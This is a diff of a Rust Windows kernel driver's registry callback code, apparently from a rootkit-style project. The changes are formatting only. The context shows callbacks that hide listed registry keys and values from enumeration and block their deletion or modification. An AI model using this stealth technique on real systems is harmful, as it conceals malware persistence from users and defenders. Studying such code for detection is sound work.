@@ -2,22 +2,25 @@
 
 use alloc::{format, string::String};
 use core::{ffi::c_void, ptr::null_mut};
+
 use wdk::println;
-use wdk_sys::ntddk::*;
 use wdk_sys::_REG_NOTIFY_CLASS::*;
+use wdk_sys::ntddk::*;
 use wdk_sys::{_MODE::KernelMode, *};
 
-use crate::{
-    registry::{
-        utils::{check_key, enumerate_key},
-        Registry,
-    },
-    utils::{pool::PoolMemory, valid_kernel_memory},
+use crate::utils::{pool::PoolMemory, valid_kernel_memory};
+use crate::registry::{
+    Registry,
+    utils::{check_key, enumerate_key},
 };
-
 use super::{
-    utils::{check_key_value, enumerate_value_key, RegistryInfo},
-    HIDE_KEYS, HIDE_KEY_VALUES, PROTECTION_KEYS, PROTECTION_KEY_VALUES,
+    HIDE_KEY_VALUES, HIDE_KEYS, 
+    PROTECTION_KEY_VALUES, PROTECTION_KEYS
+};
+use super::utils::{
+    RegistryInfo, 
+    check_key_value, 
+    enumerate_value_key
 };
 
 /// Handle for Registry Callback.
@@ -34,8 +37,7 @@ pub static mut CALLBACK_REGISTRY: LARGE_INTEGER = unsafe { core::mem::zeroed() }
 /// # Returns
 ///
 /// * A status code indicating the result of the operation.
-pub unsafe extern "C" 
-fn registry_callback(
+pub unsafe extern "C" fn registry_callback(
     _callback_context: *mut c_void,
     argument1: *mut c_void,
     argument2: *mut c_void,
@@ -163,14 +165,14 @@ unsafe fn post_enumerate_key_value(info: *mut REG_POST_OPERATION_INFORMATION) ->
         &mut result_length,
     ) {
         if !Registry::check_target(key.clone(), value_name.clone(), HIDE_KEY_VALUES.lock()) {
-            if let Some(pre_info_key_info) = (pre_info.KeyValueInformation as *mut c_void).as_mut()
-            {
+            if let Some(pre_info_key_info) = (pre_info.KeyValueInformation as *mut c_void).as_mut() {
                 *(*pre_info).ResultLength = result_length;
                 core::ptr::copy_nonoverlapping(
                     buffer,
                     pre_info_key_info as *mut _ as *mut u8,
                     result_length as usize,
                 );
+
                 break;
             } else {
                 println!("Failed to copy key information.");
@@ -256,6 +258,7 @@ unsafe fn post_enumerate_key(info: *mut REG_POST_OPERATION_INFORMATION) -> NTSTA
                     pre_info_key_info as *mut _ as *mut u8,
                     result_length as usize,
                 );
+
                 break;
             } else {
                 println!("Failed to copy key information.");
@@ -327,8 +330,7 @@ unsafe fn pre_delete_value_key(info: *mut REG_DELETE_VALUE_KEY_INFORMATION) -> N
         return STATUS_SUCCESS;
     }
 
-    let buffer =
-        core::slice::from_raw_parts((*value_name).Buffer, ((*value_name).Length / 2) as usize);
+    let buffer = core::slice::from_raw_parts((*value_name).Buffer, ((*value_name).Length / 2) as usize);
     let name = String::from_utf16_lossy(buffer);
     if Registry::<(String, String)>::check_target(
         key.clone(),
@@ -369,8 +371,7 @@ unsafe fn pre_set_value_key(info: *mut REG_SET_VALUE_KEY_INFORMATION) -> NTSTATU
         return STATUS_SUCCESS;
     }
 
-    let buffer =
-        core::slice::from_raw_parts((*value_name).Buffer, ((*value_name).Length / 2) as usize);
+    let buffer = core::slice::from_raw_parts((*value_name).Buffer, ((*value_name).Length / 2) as usize);
     let name = String::from_utf16_lossy(buffer);
     if Registry::check_target(key.clone(), name.clone(), PROTECTION_KEY_VALUES.lock()) {
         STATUS_ACCESS_DENIED
@@ -416,6 +417,5 @@ unsafe fn read_key<T: RegistryInfo>(info: *mut T) -> Result<String, NTSTATUS> {
     let name = String::from_utf16_lossy(buffer);
 
     CmCallbackReleaseKeyObjectIDEx(reg_path);
-
     Ok(name)
 }
